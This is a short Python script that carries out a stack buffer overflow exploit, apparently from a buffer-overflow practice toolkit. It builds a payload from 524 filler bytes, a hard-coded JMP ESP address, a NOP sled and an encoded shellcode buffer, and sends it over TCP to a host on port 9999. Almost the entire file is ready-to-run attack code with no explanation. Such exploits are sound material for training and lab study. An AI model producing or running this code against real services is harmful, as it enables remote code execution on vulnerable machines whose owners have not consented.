#!/usr/bin/python3
#_*_ coding: utf8 _*_

import socket

"""
Project repository: https://github.com/JoshuaProvoste/Stack-Buffer-Overflow-Python-Toolkit 
"""
buf =  b""
buf += b"\xda\xcc\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x52\xbd\x07"
buf += b"\x45\x38\xf3\x83\xc7\x04\x31\x6f\x13\x03\x68\x56\xda"
buf += b"\x06\x8a\xb0\x98\xe9\x72\x41\xfd\x60\x97\x70\x3d\x16"
buf += b"\xdc\x23\x8d\x5c\xb0\xcf\x66\x30\x20\x5b\x0a\x9d\x47"
buf += b"\xec\xa1\xfb\x66\xed\x9a\x38\xe9\x6d\xe1\x6c\xc9\x4c"
buf += b"\x2a\x61\x08\x88\x57\x88\x58\x41\x13\x3f\x4c\xe6\x69"
buf += b"\xfc\xe7\xb4\x7c\x84\x14\x0c\x7e\xa5\x8b\x06\xd9\x65"
buf += b"\x2a\xca\x51\x2c\x34\x0f\x5f\xe6\xcf\xfb\x2b\xf9\x19"
buf += b"\x32\xd3\x56\x64\xfa\x26\xa6\xa1\x3d\xd9\xdd\xdb\x3d"
buf += b"\x64\xe6\x18\x3f\xb2\x63\xba\xe7\x31\xd3\x66\x19\x95"
buf += b"\x82\xed\x15\x52\xc0\xa9\x39\x65\x05\xc2\x46\xee\xa8"
buf += b"\x04\xcf\xb4\x8e\x80\x8b\x6f\xae\x91\x71\xc1\xcf\xc1"
buf += b"\xd9\xbe\x75\x8a\xf4\xab\x07\xd1\x90\x18\x2a\xe9\x60"
buf += b"\x37\x3d\x9a\x52\x98\x95\x34\xdf\x51\x30\xc3\x20\x48"
buf += b"\x84\x5b\xdf\x73\xf5\x72\x24\x27\xa5\xec\x8d\x48\x2e"
buf += b"\xec\x32\x9d\xe1\xbc\x9c\x4e\x42\x6c\x5d\x3f\x2a\x66"
buf += b"\x52\x60\x4a\x89\xb8\x09\xe1\x70\x2b\xf6\x5e\x6f\x38"
buf += b"\x9e\x9c\x8f\x2f\x03\x28\x69\x25\xab\x7c\x22\xd2\x52"
buf += b"\x25\xb8\x43\x9a\xf3\xc5\x44\x10\xf0\x3a\x0a\xd1\x7d"
buf += b"\x28\xfb\x11\xc8\x12\xaa\x2e\xe6\x3a\x30\xbc\x6d\xba"
buf += b"\x3f\xdd\x39\xed\x68\x13\x30\x7b\x85\x0a\xea\x99\x54"
buf += b"\xca\xd5\x19\x83\x2f\xdb\xa0\x46\x0b\xff\xb2\x9e\x94"
buf += b"\xbb\xe6\x4e\xc3\x15\x50\x29\xbd\xd7\x0a\xe3\x12\xbe"
buf += b"\xda\x72\x59\x01\x9c\x7a\xb4\xf7\x40\xca\x61\x4e\x7f"
buf += b"\xe3\xe5\x46\xf8\x19\x96\xa9\xd3\x99\xb6\x4b\xf1\xd7"
buf += b"\x5e\xd2\x90\x55\x03\xe5\x4f\x99\x3a\x66\x65\x62\xb9"
buf += b"\x76\x0c\x67\x85\x30\xfd\x15\x96\xd4\x01\x89\x97\xfc"

xp = "192.168.21.140"
port = 9999

A = "\x41" * 524
jmp_esp = "\xF3\x12\x17\x31"
nops = "\x90" * 20

calc_payload = A + jmp_esp + nops + buf

try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((xp,port))
	sock.recv(1024)			
	sock.send(calc_payload)
except ConnectionRefusedError:
    print("Connection error. Review the IP address or port.")
    exit()
except socket.timeout:
    sock.close()
    print("\nConnection error. Timeout!")
except socket.error:
    sock.close()
    pass
except KeyboardInterrupt:
    sock.close()
    print("\n\nConnection closed. Bye!")
    exit()
